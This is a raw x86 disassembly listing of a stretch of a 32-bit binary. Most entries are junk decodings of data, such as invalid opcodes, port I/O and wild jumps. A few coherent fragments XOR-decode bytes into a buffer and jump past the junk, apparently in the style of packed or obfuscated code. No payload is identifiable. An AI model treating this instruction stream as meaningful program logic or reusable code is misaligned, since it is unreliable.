  40c855:	add    esi,ebx
  40c857:	mov    ch,0x2f
  40c859:	ins    BYTE PTR es:[edi],dx
  40c85a:	push   cs
  40c85b:	adc    al,BYTE PTR [ebp-0x7ae3eb38]
  40c861:	mov    al,ds:0x297ccca7
  40c866:	inc    ebx
  40c867:	adc    BYTE PTR [ebx+0x6f59b594],0xbe
  40c86e:	out    0x6b,eax
  40c870:	jecxz  0x40c809
  40c872:	xor    al,0xfb
  40c874:	fnstcw WORD PTR [ecx-0x73]
  40c877:	test   BYTE PTR [ebp+0x51],dl
  40c87a:	lods   al,BYTE PTR ds:[esi]
  40c87b:	repnz hlt 
  40c87d:	or     ah,bh
  40c87f:	inc    ebx
  40c880:	or     ecx,eax
  40c882:	stos   DWORD PTR es:[edi],eax
  40c883:	aaa    
  40c884:	xor    eax,0x4f8769bd
  40c889:	in     al,0x9b
  40c88b:	cmp    eax,0x13d7364e
  40c890:	ret    
  40c891:	jecxz  0x40c903
  40c893:	pop    ds
  40c894:	int3   
  40c895:	icebp  
  40c896:	sar    DWORD PTR [edx-0x706c52f6],1
  40c89c:	addr16 sahf 
  40c89e:	adc    edi,edi
  40c8a0:	xor    al,0xe5
  40c8a2:	out    0xe0,al
  40c8a4:	popf   
  40c8a5:	adc    DWORD PTR [edi-0x1a53f1d8],edx
  40c8ab:	aaa    
  40c8ac:	and    al,0x3d
  40c8ae:	(bad)  
  40c8af:	xchg   esi,eax
  40c8b0:	add    eax,DWORD PTR [ebx]
  40c8b2:	fcom   DWORD PTR [eax-0x1d]
  40c8b5:	and    DWORD PTR [ebp+edi*1-0x9ad75ce],0x8a7e4eb6
  40c8c0:	xchg   esp,eax
  40c8c1:	cmp    bl,BYTE PTR [edx-0x77ffcd8e]
  40c8c7:	push   ebp
  40c8c8:	jnp    0xd074bd23
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	push   es
  40c924:	or     esi,DWORD PTR [edi-0x24]
  40c927:	ins    DWORD PTR es:[edi],dx
  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c8d0
  40c930:	jo     0x40c969
  40c932:	arpl   WORD PTR [edi],dx
  40c934:	push   ecx
  40c935:	cld    
  40c936:	mov    ah,ch
  40c938:	pop    DWORD PTR [esi+0x6cc109de]
  40c93e:	push   ds
  40c93f:	lock (bad) 
  40c941:	push   ds
  40c942:	leave  
  40c943:	and    DWORD PTR [ebp+0x3bb5b345],ebx
  40c949:	mov    esp,0x2ca63cd1
  40c94e:	mov    edi,0x25fa6ad9
  40c953:	fcmovu st,st(3)
  40c955:	ins    BYTE PTR es:[edi],dx
  40c956:	mov    dh,0x51
  40c958:	xchg   DWORD PTR [eax+0x67],ebp
  40c95b:	xchg   edi,eax
  40c95c:	lods   eax,DWORD PTR ds:[esi]
  40c95d:	push   ds
  40c95e:	out    dx,eax
  40c95f:	and    al,0x33
  40c961:	push   esp
  40c962:	cmp    DWORD PTR [esi*4+0x10d0c345],eax
  40c969:	jb     0x40c93a
  40c96b:	xchg   esi,eax
  40c96c:	mov    bh,0x6d
  40c96e:	mov    esp,0x80be3f6
  40c973:	push   0x40
  40c975:	ret    
  40c976:	jle    0x40c954
  40c978:	(bad)
  40c97b:	out    0xb3,eax
  40c97d:	and    ecx,edi
  40c97f:	xor    dh,BYTE PTR [edi+edx*4]
  40c982:	enter  0xdfe1,0xc3
  40c986:	push   edi
  40c987:	jae    0x40c971
  40c989:	arpl   bp,cx
  40c98b:	arpl   WORD PTR [edx-0x72],bp
  40c98e:	push   edx
  40c98f:	sbb    esi,DWORD PTR [ebp+ebx*8-0x5868060]
  40c996:	xor    al,0xd8
  40c998:	xchg   ebx,eax
  40c999:	push   edx
  40c99a:	and    eax,esi
  40c99c:	inc    edx
  40c99d:	loope  0x40c95f
  40c99f:	mov    al,cl
  40c9a1:	jl     0x40c99e
  40c9a3:	sub    DWORD PTR cs:[ecx],0x18
  40c9a7:	and    esp,eax
  40c9a9:	pop    ebp
  40c9aa:	push   0xffffff82
  40c9ac:	fwait
  40c9ad:	jl     0x40c948
  40c9af:	aaa    
  40c9b0:	enter  0x317b,0xee
  40c9b4:	sbb    al,BYTE PTR [eax+0xc75d0a3]
  40c9ba:	sbb    DWORD PTR [eax-0x1239a596],ecx
  40c9c0:	hlt    
  40c9c1:	das    
  40c9c2:	jmp    DWORD PTR [edi+edi*1]
  40c9c5:	add    eax,DWORD PTR [edx+0x7df5aa3c]
  40c9cb:	(bad)  
  40c9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9cd:	ins    BYTE PTR es:[edi],dx
  40c9ce:	sbb    eax,0x729f1a68
  40c9d3:	pop    ebx
  40c9d4:	mov    ebx,0xd75444c0
  40c9d9:	mov    ecx,0x3ab417ae
  40c9de:	test   al,0x9f
  40c9e0:	cmp    al,0x6
  40c9e2:	ror    DWORD PTR [ecx],1
  40c9e4:	jecxz  0x40ca24
  40c9e6:	mov    ebp,0x69256d1b
  40c9eb:	arpl   WORD PTR [edi],di
  40c9ed:	daa    
  40c9ee:	mov    dl,0x8
  40c9f0:	rol    DWORD PTR [ecx],cl
  40c9f2:	pushf  
  40c9f3:	dec    ecx
  40c9f4:	enter  0xc12e,0x37
  40c9f8:	push   ds
  40c9f9:	dec    ebx
  40c9fa:	pop    ebp
  40c9fc:	mov    eax,DWORD PTR [esi]
  40c9fe:	or     al,BYTE PTR [esi]
  40ca00:	sbb    BYTE PTR [ecx+ecx*8-0x5e],ah
  40ca04:	mov    al,BYTE PTR [edi]
  40ca06:	pop    ebx
  40ca07:	or     al,0xad
  40ca0a:	cmp    BYTE PTR [ecx],ah
  40ca0c:	scas   eax,DWORD PTR es:[edi]
  40ca0d:	mov    ds:0x66298379,al
  40ca12:	rcl    DWORD PTR [ebx-0x28a76178],0x8e
  40ca19:	jge    0x40ca39
  40ca1b:	sub    eax,0x9da18bc
  40ca20:	pusha  
  40ca21:	(bad)  
  40ca22:	js     0x40c9d6
  40ca24:	loopne 0x40ca6c
  40ca26:	pop    ebp
  40ca27:	int    0x14
  40ca29:	mov    ebp,0x86bb2b4c
  40ca2e:	mov    ebx,0x58c3f39d
  40ca33:	addr16 call 0x95e7:0xafda083
  40ca3b:	outs   dx,BYTE PTR ds:[esi]
  40ca3c:	cs xor eax,ecx
  40ca3f:	(bad)  
  40ca40:	and    esi,ebp
  40ca42:	sti    
  40ca43:	push   ebx
  40ca44:	cmp    eax,0xd2f100c6
  40ca49:	rcr    BYTE PTR [eax-0x49b4d930],0x5a
  40ca50:	loop   0x40ca9d
  40ca52:	cs scas al,BYTE PTR es:[edi]
  40ca54:	mov    ebx,0xc2a9373
  40ca59:	gs out dx,eax
  40ca5b:	hlt    
  40ca5c:	aas    
  40ca5d:	jae    0x40caca
  40ca5f:	fidiv  DWORD PTR [edx+0x34]
  40ca62:	adc    DWORD PTR [eax],edx
  40ca64:	xchg   DWORD PTR [ecx],edx
  40ca66:	(bad)  
  40ca67:	mov    edi,0xb3048308
  40ca6c:	outs   dx,DWORD PTR ds:[esi]
  40ca6d:	or     ah,BYTE PTR [eax+0x65]
  40ca70:	out    dx,eax
  40ca71:	or     ch,bh
  40ca73:	ret    0x7f2a
  40ca76:	neg    BYTE PTR [eax+edx*8]
  40ca79:	arpl   WORD PTR [esi+eiz*8-0x487146d8],sp
  40ca80:	dec    edx
  40ca81:	mov    WORD PTR [ecx+0x63],?
  40ca84:	lahf   
  40ca85:	or     bl,dl
  40ca87:	(bad)  
  40ca88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca89:	xor    al,0xe2
  40ca8b:	pop    ebp
  40ca8c:	into   
  40ca8d:	cdq    
  40ca8e:	or     ebp,DWORD PTR [ecx-0x6d589744]
  40ca94:	lahf   
  40ca95:	mov    esi,0x159fbbfe
  40ca9a:	mov    eax,0x5f73d3c0
  40ca9f:	mov    eax,ds:0x8836a11e
  40caa4:	ret    0x5486
  40caa7:	jle    0x40ca46
  40caa9:	sahf   
  40caaa:	mov    edi,es
  40caac:	xor    dh,ah
  40caae:	cmp    cl,BYTE PTR [ebx]
  40cab0:	int3   
  40cab1:	int    0xa8
  40cab3:	push   ebp
  40cab4:	pop    es
  40cab5:	add    BYTE PTR ds:0xfce1dd8b,bl
  40cabb:	test   al,0x16
  40cabd:	push   eax
  40cabe:	into   
  40cabf:	int3   
  40cac0:	arpl   WORD PTR [esi+edi*4],sp
  40cac3:	iret   
  40cac4:	lahf   
  40cac5:	push   ebp
  40cac6:	xlat   BYTE PTR cs:[ebx]
  40cac8:	adc    DWORD PTR [ebx+0x70fe4d4d],0xf5cbe42c
  40cad2:	fsub   DWORD PTR [eax+0x6fbaf1a6]
  40cad8:	frstor [edx-0xd762b1e]
  40cade:	ud2    
  40cae0:	xchg   DWORD PTR [ebx-0x75bae82d],ecx
  40cae6:	xor    eax,0x4f2fbd6
  40caeb:	(bad)  
  40caec:	or     ebx,esp
  40caee:	fnstenv [esi]
  40caf0:	jns    0x40cb03
  40caf2:	mov    cl,0xed
  40caf4:	or     BYTE PTR ds:0x2346,dh
  40caf9:	inc    ebp
  40cafa:	mov    ss,WORD PTR [ebp+eiz*8+0x7769f909]
  40cb01:	sbb    DWORD PTR [ebx+eax*8-0x7c],ecx
  40cb05:	das    
  40cb06:	sub    dl,bh
  40cb08:	pop    esi
  40cb09:	jg     0x40cae1
  40cb0b:	test   BYTE PTR [eax+eiz*1+0x3480f421],dl
  40cb12:	stos   BYTE PTR es:[edi],al
  40cb13:	push   0xa4a3c87d
  40cb18:	or     bh,BYTE PTR [ebx-0x44]
  40cb1b:	xor    BYTE PTR ds:0x905b0153,dl
  40cb21:	cmp    eax,0x673a2ed9
  40cb26:	stc    
  40cb27:	xchg   ax,ax
  40cb29:	sub    ah,BYTE PTR [ebp-0xb75250a]
  40cb2f:	loopne 0x40cb3b
  40cb31:	add    eax,ecx
  40cb33:	xchg   ebp,eax
  40cb34:	mov    cl,0x27
  40cb36:	xchg   ebx,eax
  40cb37:	push   eax
  40cb38:	(bad)  [edx]
  40cb3a:	adc    cl,cl
  40cb3c:	outs   dx,BYTE PTR ds:[esi]
  40cb3d:	fidivr DWORD PTR [ecx+0x7281dba8]
  40cb43:	mov    esi,0x77f7b4a8
  40cb48:	push   edx
  40cb49:	das    
  40cb4a:	pusha  
  40cb4b:	jmp    0x7925:0x49b8a219
  40cb52:	call   0x6d7:0xfbf3a267
  40cb59:	stos   BYTE PTR es:[edi],al
  40cb5a:	xor    DWORD PTR [edi],edi
  40cb5c:	mov    ecx,0x1102f93d
  40cb61:	mov    ds:0xf398a263,al
  40cb66:	adc    eax,0xe2bb5703
  40cb6b:	mov    ebx,0x7795237c
  40cb70:	aam    0x98
  40cb72:	fs sar BYTE PTR es:[ebx-0x4440a7e8],0x30
  40cb7b:	mov    WORD PTR [eax-0x3e],?
  40cb7e:	dec    edx
  40cb7f:	fmul   DWORD PTR [ecx+edi*4+0xa]
  40cb83:	cmp    al,0x8a
  40cb85:	jge    0x40cb9a
  40cb87:	jmp    0xb0d5d3f4
  40cb8c:	ja     0x40cb30
  40cb8e:	adc    DWORD PTR [edi+0x5f],edx
  40cb91:	push   ecx
  40cb92:	sbb    bh,BYTE PTR [edx-0x4d55f0b6]
  40cb98:	adc    eax,0x37544e0b
  40cb9d:	inc    eax
  40cb9e:	int3   
  40cb9f:	pop    ss
  40cba0:	imul   edx,DWORD PTR [ecx+0x6f5b1950],0x60
  40cba7:	ret    0x4939
  40cbaa:	mov    eax,ds:0x7495e24a
  40cbaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbb0:	sbb    DWORD PTR [ebp-0x29],ecx
  40cbb3:	cli    
  40cbb4:	data16 imul BYTE PTR ds:[ecx]
  40cbb8:	stos   BYTE PTR es:[edi],al
  40cbb9:	aas    
  40cbba:	imul   ebp,DWORD PTR [ebp+0x33],0x17
  40cbbe:	inc    eax
  40cbbf:	fld    DWORD PTR [edx+0x20bc2c9]
  40cbc5:	push   esi
  40cbc6:	shl    DWORD PTR [ecx],1
  40cbc8:	sbb    DWORD PTR [edi],ecx
  40cbca:	jne    0x40cb6c
  40cbcc:	cmp    eax,0x868c7422
  40cbd1:	repz xchg ebx,eax
  40cbd3:	int3   
  40cbd4:	mov    eax,ds:0x3adb9da0
  40cbd9:	mov    ecx,0x64a1d798
  40cbde:	mov    cl,0x2a
  40cbe0:	mov    ebx,0x23690f7c
  40cbe5:	cmp    edi,edi
  40cbe7:	xchg   edx,eax
  40cbe8:	mov    ebx,0xf563105a
  40cbed:	mov    ebx,0xce287d8e
  40cbf2:	leave  
  40cbf3:	xchg   edx,eax
  40cbf4:	jg     0x40cc17
  40cbf6:	addr16 pop ebx
  40cbf8:	or     esi,DWORD PTR [esi+0x15be456e]
  40cbfe:	dec    edi
  40cbff:	dec    ecx
  40cc00:	mov    ebp,0xcf8b2341
  40cc05:	ins    DWORD PTR es:[edi],dx
  40cc06:	arpl   WORD PTR [eax+0x61],ax
  40cc09:	mov    BYTE PTR [edi+0x77],ch
  40cc0c:	mov    al,BYTE PTR ds:0x850c7236
  40cc12:	mov    al,ds:0xbccf7520
  40cc17:	aas    
  40cc18:	cmp    BYTE PTR [edi],0xc
  40cc1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc1c:	aad    0xfd
  40cc1e:	pop    ecx
  40cc1f:	(bad)
  40cc22:	and    al,0x55
  40cc24:	scas   eax,DWORD PTR es:[edi]
  40cc25:	out    0xcc,al
  40cc27:	and    al,0x2c
  40cc29:	mov    ah,0x19
  40cc2b:	pushf  
  40cc2c:	ror    BYTE PTR ds:[eax],1
  40cc2f:	sub    bh,bh
  40cc31:	sbb    BYTE PTR [edx+0x2383e677],al
  40cc37:	shl    DWORD PTR [esi-0x38],cl
  40cc3a:	test   eax,0x2a842655
  40cc3f:	push   eax
  40cc40:	dec    DWORD PTR [ebp-0x674d23e7]
  40cc46:	cmp    eax,0x378e055a
  40cc4b:	call   0x229a646f
  40cc50:	push   ds
  40cc51:	lds    eax,FWORD PTR [ebx+0x24]
  40cc54:	out    0x1,eax
  40cc56:	cmp    ecx,ebx
  40cc58:	dec    edx
  40cc59:	ret    0xbcb7
  40cc5c:	sub    eax,0xf4f6b5f3
  40cc61:	inc    edi
  40cc62:	into   
  40cc63:	mov    edx,0x34f4bc6f
  40cc68:	or     al,0x62
  40cc6a:	xchg   ecx,eax
  40cc6b:	sahf   
  40cc6c:	ret    0xe7e
  40cc6f:	ret    0x20d1
  40cc72:	xchg   edx,eax
  40cc73:	pushf  
  40cc74:	jb     0x40cc5c
  40cc76:	loopne 0x40cc87
  40cc78:	mov    ds:0xbc901c89,eax
  40cc7d:	sar    BYTE PTR [ecx-0x70],1
  40cc80:	jne    0x40cc28
  40cc82:	inc    ebp
  40cc83:	les    ebx,FWORD PTR [ebx+eax*1]
  40cc86:	rol    DWORD PTR [ebx],1
  40cc88:	stc    
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	xchg   edi,eax
  40cca7:	push   esi
  40cca8:	icebp  
  40cca9:	inc    esi
  40ccaa:	cmp    edx,DWORD PTR [edx+0x79ca7c7c]
  40ccb0:	jl     0x40cd2e
  40ccb2:	xchg   BYTE PTR [ebx],cl
  40ccb4:	jno    0x40ccd0
  40ccb6:	int3   
  40ccb7:	or     DWORD PTR [ecx-0x2f],esp
  40ccba:	pop    ebp
  40ccbb:	test   ecx,edx
  40ccbd:	cmp    esp,DWORD PTR [edx+0x52e4b479]
  40ccc3:	sbb    bh,ch
  40ccc5:	arpl   WORD PTR [ebp-0x6b634483],di
  40cccb:	fldenv [ebx-0x5ad1366d]
  40ccd1:	bound  eax,QWORD PTR [ecx+0x7d]
  40ccd4:	mov    dh,0xa9
  40ccd6:	std    
  40ccd7:	icebp  
  40ccd8:	and    esp,DWORD PTR [esi]
  40ccda:	out    dx,al
  40ccdb:	std    
  40ccdc:	bound  edi,QWORD PTR [edx-0x16]
  40ccdf:	int3   
  40cce0:	ret    0xcd7
  40cce3:	xor    al,cl
  40cce5:	jno    0x40cd0b
  40cce7:	ret    
  40cce8:	cdq    
  40cce9:	mov    al,BYTE PTR [edi+0x52f80719]
  40ccef:	sahf   
  40ccf0:	push   ds
  40ccf1:	mov    DWORD PTR [ecx-0x4b2f5d16],esi
  40ccf7:	addr16 xchg ecx,eax
  40ccf9:	nop
  40ccfa:	jmp    0x358f79e7
  40ccff:	mov    ds:0xb6766666,al
  40cd04:	cmp    dl,ah
  40cd06:	push   0xffffff93
  40cd08:	aam    0xf2
  40cd0a:	aaa    
  40cd0b:	dec    edx
  40cd0c:	dec    esp
  40cd0d:	adc    edi,DWORD PTR [ecx+0xae24aab]
  40cd13:	daa    
  40cd14:	loopne 0x40cca1
  40cd16:	push   esi
  40cd17:	xor    edx,DWORD PTR [ecx-0x6cb2ab02]
  40cd1d:	pop    esi
  40cd1e:	sub    ebx,DWORD PTR [eax]
  40cd20:	aam    0xc
  40cd22:	inc    esp
  40cd23:	xchg   ecx,eax
  40cd24:	dec    edi
  40cd25:	(bad)  
  40cd26:	mov    eax,ds:0x4c262449
  40cd2b:	cs jl  0x40cd00
  40cd2e:	pop    es
  40cd2f:	test   eax,0xd3c1206
  40cd34:	adc    DWORD PTR [edi+0x4e4edc4],edi
  40cd3a:	loopne 0x40cd00
  40cd3c:	pop    esp
  40cd3d:	gs fcmovb st,st(3)
  40cd40:	or     dl,dh
  40cd42:	cmp    al,0x94
  40cd44:	lea    esi,ds:0xd0c4e281
  40cd4a:	rcr    ah,0x47
  40cd4d:	jno    0x40cd60
  40cd4f:	pop    ebx
  40cd50:	xor    al,0xaf
  40cd52:	mov    edi,0xfb3c160
  40cd57:	sub    BYTE PTR [edi],dl
  40cd59:	(bad)  
  40cd5a:	aad    0x13
  40cd5c:	sub    al,0xde
  40cd5e:	test   ebp,0x58e852c2
  40cd64:	push   0x72d6f86c
  40cd69:	loopne 0x40ccf0
  40cd6b:	enter  0x41e5,0xf2
  40cd6f:	dec    edx
  40cd70:	ret    
  40cd71:	cmp    cl,BYTE PTR [edi+0x1a]
  40cd74:	adc    DWORD PTR [esi+0x37163502],esi
  40cd7a:	les    ecx,FWORD PTR [ebx+0x361cf35d]
  40cd80:	or     al,BYTE PTR [ebx+ecx*1]
  40cd83:	push   ds
  40cd84:	out    dx,eax
  40cd85:	addr16 int 0x65
  40cd88:	jecxz  0x40cd7d
  40cd8a:	inc    ebx
  40cd8b:	lods   eax,DWORD PTR ds:[esi]
  40cd8c:	rcr    DWORD PTR [eax],cl
  40cd8e:	mov    esi,0xd9cf4995
  40cd93:	fmul   st,st(6)
  40cd95:	shl    DWORD PTR [edx-0x10],1
  40cd98:	rcl    BYTE PTR [edx],0x2b
  40cd9b:	xchg   edi,eax
  40cd9c:	cmc    
  40cd9d:	cmp    al,ch
  40cd9f:	adc    al,0x17
  40cda1:	and    BYTE PTR [edi],cl
  40cda3:	push   esi
  40cda4:	dec    edx
  40cda5:	fwait
  40cda6:	inc    esp
  40cda7:	daa    
  40cda8:	out    dx,al
  40cda9:	fisubr DWORD PTR [edx]
  40cdab:	inc    esp
  40cdac:	and    esi,esp
  40cdae:	jae    0x40ce28
  40cdb0:	mov    al,ds:0xa28720be
  40cdb5:	add    eax,0x37afa476
  40cdba:	sbb    al,0x31
  40cdbc:	ret    
  40cdbd:	jl     0x40cdbe
  40cdbf:	int    0xda
  40cdc1:	or     eax,0x9a9cbce5
  40cdc6:	and    DWORD PTR [ebp-0x5f],edi
  40cdc9:	inc    ecx
  40cdca:	fmul   QWORD PTR [edx+0x6]
  40cdcd:	sbb    BYTE PTR [ecx],al
  40cdcf:	pop    es
  40cdd0:	push   edx
  40cdd1:	mov    dh,0x98
  40cdd3:	repz push ss
  40cdd5:	ds ret 0x5d7
  40cdd9:	mov    edx,0x1c68793e
  40cdde:	scas   al,BYTE PTR es:[edi]
  40cddf:	xchg   esp,eax
  40cde0:	fnstcw WORD PTR [ebx+edi*2+0x5bbd262c]
  40cde7:	out    0x31,al
  40cde9:	pop    esi
  40cdea:	ret    0x3485
  40cded:	in     eax,0x3a
  40cdef:	cmp    dh,bl
  40cdf1:	dec    ebp
  40cdf2:	out    0xaa,eax
  40cdf4:	js     0x40ce28
  40cdf6:	xor    eax,0x7956ff91
  40cdfb:	popa   
  40cdfc:	pop    es
  40cdfd:	mov    ecx,0xcaeb6ef4
  40ce02:	adc    BYTE PTR [ebp+0x65b7f414],dh
  40ce08:	(bad)  [ebx+0x54ddc8de]
  40ce0e:	xlat   BYTE PTR ds:[ebx]
  40ce0f:	(bad)  
  40ce10:	mov    edi,0x26329db4
  40ce15:	mov    dh,bl
  40ce17:	jmp    0x40ce40
  40ce19:	jae    0x40ce19
  40ce1b:	ss jnp 0x40cdce
  40ce1e:	inc    edi
  40ce1f:	mov    eax,0x1a762fa2
  40ce24:	pop    ecx
  40ce25:	pop    edx
  40ce26:	and    al,0x28
  40ce28:	xchg   edx,eax
  40ce29:	or     al,0xd5
  40ce2b:	bound  esp,QWORD PTR [ecx+ecx*4]
  40ce2e:	cmp    ch,dl
  40ce30:	mov    eax,0x451d2ac5
  40ce35:	outs   dx,BYTE PTR ds:[esi]
  40ce36:	rol    BYTE PTR [ebx+0x33],cl
  40ce39:	xor    BYTE PTR [esi],dh
  40ce3b:	adc    edi,edx
  40ce3d:	mov    eax,0x3df9307c
  40ce42:	add    dh,ch
  40ce44:	shl    bl,1
  40ce46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce47:	xchg   ebp,eax
  40ce48:	jg     0x40cdec
  40ce4a:	xchg   ecx,eax
  40ce4b:	pushf  
  40ce4c:	stc    
  40ce4d:	push   edi
  40ce4e:	addr16 or al,0x53
  40ce51:	fcomp  st(1)
  40ce53:	pop    ecx
  40ce54:	repz (bad) 
  40ce57:	push   ds
  40ce58:	fild   WORD PTR [esi+0x20]
  40ce5b:	xchg   edi,eax
  40ce5c:	cwde   
  40ce5d:	jmp    0x9970e8d8
  40ce62:	fwait
  40ce63:	sbb    ebp,ebx
  40ce65:	fwait
  40ce66:	ja     0x40ceb8
  40ce68:	add    DWORD PTR [eax+0x1a191738],edx
  40ce6e:	(bad)  
  40ce6f:	retf   
  40ce70:	inc    ebx
  40ce71:	jb     0x40ce81
  40ce73:	mov    edx,0xdb118074
  40ce78:	ret    
  40ce79:	mov    eax,0xe73cb222
  40ce7e:	push   cs
  40ce7f:	inc    esp
  40ce80:	dec    edi
  40ce81:	or     DWORD PTR [edx-0x52],edx
  40ce84:	(bad)  
  40ce85:	pop    esi
  40ce86:	push   ebp
  40ce87:	and    BYTE PTR [esi],dl
  40ce89:	push   edx
  40ce8a:	pop    esp
  40ce8b:	mov    BYTE PTR [edx+0x1d0f3566],dl
  40ce91:	imul   esi,DWORD PTR [ebx-0xc],0x95d3548b
  40ce98:	jns    0x40cebc
  40ce9a:	mov    WORD PTR [esp+edx*2+0x63709f84],ss
  40cea1:	in     al,0x19
  40cea3:	fwait
  40cea4:	sbb    ebx,esi
  40cea6:	mov    al,0x6b
  40cea8:	xchg   edi,eax
  40cea9:	enter  0xff20,0x3d
  40cead:	and    bh,bl
  40ceaf:	push   0xb95aa06b
  40ceb4:	sbb    ebp,DWORD PTR [edx+ebp*4+0x39]
  40ceb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceb9:	add    dh,bh
  40cebb:	gs fxch st(6)
  40cebe:	test   DWORD PTR [ebx-0x5],esi
  40cec1:	or     BYTE PTR [ebx+0xf390d49],bh
  40cec7:	loopne 0x40ced0
  40cec9:	adc    ch,BYTE PTR [edi]
  40cecb:	jp     0x40cef6
  40cecd:	inc    edi
  40cece:	mov    cl,BYTE PTR [esi]
  40ced0:	out    dx,al
  40ced1:	push   esp
  40ced2:	bound  edi,QWORD PTR [ebx*1-0x5ae559f2]
  40ced9:	aam    0xe1
  40cedb:	xchg   esi,eax
  40cedc:	les    ecx,FWORD PTR [esp+eiz*2+0x35]
  40cee0:	mov    eax,0x882c53f2
  40cee5:	jbe    0x40ce67
  40cee7:	out    0xc7,al
  40cee9:	in     eax,dx
  40ceea:	cs mov bl,0x6f
  40ceed:	(bad)  
  40ceee:	popf   
  40ceef:	inc    ecx
  40cef0:	sub    al,0x96
  40cef2:	mov    edi,ds
  40cef4:	pop    ebp
  40cef5:	jno    0x40cef8
  40cef7:	pop    ecx
  40cef8:	fidiv  WORD PTR es:[edx]
  40cefb:	pop    esi
  40cefc:	jecxz  0x40cef9
  40cefe:	and    eax,DWORD PTR [esi+0x20]
  40cf01:	mov    DWORD PTR [ecx],ecx
  40cf03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf04:	dec    eax
  40cf05:	leave  
  40cf06:	push   edx
  40cf07:	aaa    
  40cf08:	into   
  40cf09:	sub    al,0xa5
  40cf0b:	sub    al,0xb5
  40cf0d:	jno    0x40cec7
  40cf0f:	inc    ebp
  40cf10:	push   es
  40cf11:	popf   
  40cf12:	xchg   edx,eax
  40cf13:	adc    cl,BYTE PTR [ecx+0x4]
  40cf16:	cdq    
  40cf17:	stos   DWORD PTR es:[edi],eax
  40cf18:	jmp    FWORD PTR [ebp-0x6]
  40cf1b:	add    al,dh
  40cf1d:	cmp    BYTE PTR [esi+0x22c299d5],0xc7
  40cf24:	fnstenv [ebx]
  40cf26:	xchg   ecx,ebx
  40cf28:	rcl    BYTE PTR [esi+0x3e],0xc8
  40cf2c:	out    0x38,eax
  40cf2e:	add    eax,DWORD PTR [edi+0x36b9b488]
  40cf34:	(bad)  
  40cf35:	and    ecx,DWORD PTR [ebx+eax*1+0x7c]
  40cf39:	cmp    al,0xf3
  40cf3b:	sar    BYTE PTR [bx+si],1
  40cf3e:	inc    esi
  40cf3f:	mov    edi,0xf0e88ece
  40cf44:	adc    dl,cl
  40cf46:	jmp    0x40cf76
  40cf48:	ror    DWORD PTR [ebp-0xe402725],0xb1
  40cf4f:	aaa    
  40cf50:	sbb    DWORD PTR [edi-0x3b66a2ce],eax
  40cf56:	sub    edx,DWORD PTR [ebp+eax*4-0x4bb93075]
  40cf5d:	xchg   ebx,eax
  40cf5e:	jb     0x40cf68
  40cf60:	arpl   WORD PTR [ebp+0x3ebe6c43],ax
  40cf66:	xor    dl,BYTE PTR [ebx+esi*1]
  40cf69:	adc    cl,ch
  40cf6b:	fadd   DWORD PTR [ebx+0x42]
  40cf6e:	and    al,0x31
  40cf70:	push   0xe729ee30
  40cf75:	xor    cl,BYTE PTR [esi+0x46705c1e]
  40cf7b:	fisttp DWORD PTR [edx+edx*4]
  40cf7e:	lahf   
  40cf7f:	push   DWORD PTR [eax-0x37]
  40cf82:	addr16 pushf 
  40cf84:	in     al,0x33
  40cf86:	ficomp WORD PTR [esi+eiz*8-0x3e3e2e]
  40cf8d:	mov    ds:0xadcb2d0c,eax
  40cf92:	mov    ch,0x52
  40cf94:	xor    al,0x93
  40cf96:	iret   
  40cf97:	inc    esp
  40cf98:	sbb    ah,BYTE PTR [ebx-0x12]
  40cf9b:	in     al,0x90
  40cf9d:	shr    DWORD PTR [ebp-0x7c81bb51],1
  40cfa3:	scas   eax,DWORD PTR es:[edi]
  40cfa4:	loopne 0x40d00f
  40cfa6:	mov    dh,0x7a
  40cfa8:	les    ebp,FWORD PTR [eax+0x59]
  40cfab:	sub    dl,BYTE PTR [eax+0xd242f62]
  40cfb1:	cmp    ah,dh
  40cfb3:	adc    DWORD PTR [edx-0x42],ebx
  40cfb6:	(bad)  
  40cfb7:	stc    
  40cfb8:	js     0x40cfa5
  40cfba:	ret    
  40cfbb:	lods   al,BYTE PTR ds:[esi]
  40cfbc:	add    ch,BYTE PTR [edx+ecx*1+0x3ed104e2]
  40cfc3:	test   eax,0xc754a693
  40cfc8:	mov    ds:0xdd975b4a,al
  40cfcd:	gs push 0xd8fb7019
